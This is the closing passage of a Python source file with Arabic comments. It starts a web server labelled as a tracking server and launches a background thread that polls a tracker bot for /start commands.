# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل الخادم
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("📡 راشد — خادم التعقب جاهز")
    print(f"🌐 المنفذ: {port}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    # تشغيل polling لبوت التعقب في خلفية
    t = threading.Thread(target=_tracker_bot_poll, daemon=True)
    t.start()
    print("🤖 بوت التعقب يستقبل /start ...")

    app.run(host="0.0.0.0", port=port, debug=False)
